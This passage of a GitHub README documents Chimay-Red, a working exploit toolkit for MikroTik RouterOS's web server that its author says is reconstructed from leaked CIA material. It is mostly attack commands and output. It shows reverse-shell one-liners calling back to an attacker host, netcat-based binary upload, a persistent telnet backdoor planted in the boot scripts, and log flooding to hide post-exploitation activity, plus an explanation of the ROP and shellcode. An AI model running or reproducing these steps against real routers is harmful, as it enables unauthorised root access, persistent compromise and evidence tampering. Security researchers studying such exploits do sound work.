300ms;:beep frequency=520 length=80ms;:delay 150ms;:beep frequency=580 length=80ms;:delay 150ms;:beep frequency=480 length=80ms;:delay 500ms;'; done"

```

### Upload binaries

To upload `busybox-mips` in `/ram/busybox`

In a shell:

```
$ wget https://busybox.net/downloads/binaries/1.28.1-defconfig-multiarch/busybox-mips
$ { echo "echo Uploading..."; hexdump -v -e '"echo -e -n " 1024/1 "\\\\x%02X" " >> /ram/busybox\n"' busybox-mips | sed -e "s/\\\\\\\\x  //g"; } | nc -l -q 0 -p 1234

```

In another shell (note that this is the reverse shell command):

```
$ ./StackClash_mips.py 192.168.8.1 80 www_binary "/bin/mknod /ram/f p; /bin/telnet 192.168.8.5 1234 < /ram/f | /bin/bash > /ram/f"

```

and wait until the connection automatically close.

(Once the file is uploaded, run again reverse shell (this time only listening with `nc -l -p 1234`) and you will find busybox inside `/ram/`)

### Persistent telnet server

You can run script at each boot by creating a bash script in `/flash/etc/rc.d/run.d/`.

Pay attention to set execution permissions, or your router will stuck on boot and you will have to restore the firmware!

This example enables a persistent telnet server on port 23000.

In a shell:

```
$ wget https://busybox.net/downloads/binaries/1.28.1-defconfig-multiarch/busybox-mips
$ { echo "echo Installing..."; hexdump -v -e '"echo -e -n " 1024/1 "\\\\x%02X" " >> /flash/bin/busybox\n"' busybox-mips | sed -e "s/\\\\\\\\x  //g"; echo "chmod 777 /flash/bin/busybox"; echo "/flash/bin/busybox --install -s /flash/bin/"; echo "mkdir -p /flash/etc/rc.d/run.d"; echo 'echo -e "#!/flash/bin/sh\ntelnetd -p 23000 -l sh" > /flash/etc/rc.d/run.d/S89own'; echo "chmod 777 /flash/etc/rc.d/run.d/S89own"; echo "/nova/bin/info '/system reboot'"; echo "echo Done! Rebooting..."; } | nc -l -p 1234

```

In another shell (note that this is the reverse shell command):

```
$ ./StackClash_mips.py 192.168.8.1 80 www_binary "/bin/mknod /ram/f p; /bin/telnet 192.168.8.5 1234 < /ram/f | /bin/bash > /ram/f"

```

and wait until `Done! Rebooting...` appears.

Once the router is up again:

```
$ telnet 192.168.8.1 23000
Trying 192.168.8.1...
Connected to 192.168.8.1.
Escape character is '^]'.

MikroTik v6.38.4 (stable)
/ #

```

## StackClash\_resock\_mips

Reuse the http socket to spawn a shell, so you can have a shell without a reverse connection.

```
$ ./tools/getROSbin.py 6.38.4 mipsbe /nova/bin/www www_binary
$ ./StackClash_resock_mips.py 192.168.8.1 80 www_binary
[...]
sh: turning off NDELAY mode

Got root ;-)

```

### Upload binaries without a reverse shell

To upload `busybox-mips` in `/ram/busybox`

```
$ wget https://busybox.net/downloads/binaries/1.28.1-defconfig-multiarch/busybox-mips
$ ./StackClash_resock_mips.py 192.168.8.1 80 www_binary busybox-mips /ram/busybox
[...]
Uploading busybox-mips in /ram/busybox...
Upload done!
sh: turning off NDELAY mode

Got root ;-)

chmod 777 /ram/busybox
/ram/busybox
BusyBox v1.28.1 (2018-02-15 14:34:02 CET) multi-call binary.
[...]

```

### Change boot logo

Only RGB Bitmap 24 bit (not compressed) files are supported.

Max size: 160px width, 76px height

You can find a sample [here](/BigNerd95/Chimay-Red/blob/master/docs/logo.bmp)

```
$ ./StackClash_resock_mips.py 192.168.8.1 80 www_binary docs/logo.bmp /flash/boot/logo.bmp
[...]
Uploading docs/logo.bmp in /flash/boot/logo.bmp...
Upload done!
sh: turning off NDELAY mode

Got root ;-)

reboot
*** Connection closed by remote host ***

```

[![image](https://github.com/BigNerd95/Chimay-Red/raw/master/docs/boot_image.jpg)](https://github.com/BigNerd95/Chimay-Red/raw/master/docs/boot_image.jpg)

### Hide logs

To remove logs after your post exploitation actions

```
/ # /nova/bin/info ":for i from=1 to=1000 do={ :log info message='Some dummy info' }"

```

# FAQ

## Where does one get the chimay-red.py file, that this tool kit relies on?

This is a reverse engineering of leaked CIA documentation.

There is no chimay-red.py publicly available.

## I can't understand how the stack clash work.

I'll update the PDF as soon as I have enough time, anyway:

We know that:

* each thread has 128KB of stack
* each stack of each thread is stacked on the top of the previous thread.

Thanks to Content-Length and alloca macro we can control the Stack Pointer and where the post data will be written.

If we send a Content-Length bigger than 128KB to socket of thread A, the Stack Pointer will point inside the stack of another thread (B) and so the POST data (of thread A) will be written inside the stack of thread B (in any position we want, we only need to adjust the Content-Length value).

So now we can write a ROP chain in the stack of thread B starting from a position where a return address is saved.

When we close the socket of thread B, the ROP chain will start because the function that is waiting for data will return (but on our modified address).

#### x86

The ROP chain construct "system" string and "your\_shell\_cmd" string looking for chunks of strings inside the binary and concatenating them in an unused area of memory.

Then we return to "dlsym" function (present in the PLT) passing as argument the address of just created string "system" to find the address of "system" function.

Now we can return to the address of system passing as argument the address of the just created string "your\_shell\_cmd".

#### mips

DEP is disabled on this version of www, so I can execute the stack.

But I cannot use system function because "/bin/sh" is not present on the file system, so I used execve directly.

A small ROP (3 gadgets) find the address of a location on the stack (where I put the shell code), and then jump to that address.

In the shell code I make a fork (syscall 4002), then I populate an array of 4 pointers with the address of the strings "/bin/bash", "-c", "your\_shell\_cmd" using the leaked address of the stack (the last pointer is left NULL).

Then I populate a0, a1, a2 with rispectively: address of "/bin/bash", address of the array populated at the preceeding step and the address of the NULL entry of the array.

At this point I can launch the syscall 4011 (execve) to execute my bash command.

## Not wokring on some versions

I have no time to test all RouterOS versions.

On all stable version i tested (6.28, 6.27, 6.37.2, 6.37.3, 6.38.3, 6.38.4) it is working (both x86 and mipsbe).

On 6.37.5 it isn't working, but I noticed that this is a bugfix version.

Maybe on all bugfix version my tool is not working (not verified).

## HTTPS

I implemented the HTTPS version using `ssl.wrap_socket` and it is working if www has just started.

But if www has been running for some time I have to make it crash before running the exploit.

If I make www crash with HTTPS enabled, then www doesn't bind on HTTPS socket any more...

So for now I didn't include HTTPS support in the public release because in most scenario it is totally NOT working and make the web server unreachable after the crash.

## Architecture discovery

I didn't find a way to discover the architecture via the web server (www).

I think the CIA tool was using MNDP (Mikrotik Network Discovery Protocol), but it is only available in the same LAN, so it will not work from a remote network.

So I didn't include the architecture discovery in my tool.

You have to test all the archtecture if you are remotely or use a MNDP tool if you in the same LAN (there are a lots of MNDP tools on github).

## Others architectures than x86 and MIPSBE/SMIPS

I have no boards based on ARM, TILE, PowerPC and MMIPS, so I can't debug the vulnerability on these versions.

(Probably for the last one it is enough to convert the mipsbe addresses in little endian).

If you can support other arch then send a PR!

## Firmware upgrade persistence

It's possibile to make your rootkit persistent to firmware upgrade by customizing the initramfs...[more info](https://yassine.tioual.com/index.php/2017/04/26/backdoor-initramfs-and-make-your-rootkit-persistent/)

## About

Working POC of Mikrotik exploit from Vault 7 CIA Leaks

### Resources

[Readme](#readme-ov-file)

[Activity](/BigNerd95/Chimay-Red/activity)
### Stars

[**657**
stars](/BigNerd95/Chimay-Red/stargazers)
### Watchers

[**52**
watching](/BigNerd95/Chimay-Red/watchers)
### Forks

[**216**
forks](/BigNerd95/Chimay-Red/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FBigNerd95%2FChimay-Red&report=BigNerd95+%28user%29)

## [Releases](/BigNerd95/Chimay-Red/releases)

No releases published

## [Packages 0](/users/BigNerd95/packages?repo_name=Chimay-Red)

No packages published

## [Contributors 3](/BigNerd95/Chimay-Red/graphs/contributors)

## Languages

* [Python
  100.0%](/BigNerd95/Chimay-Red/search?l=python)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


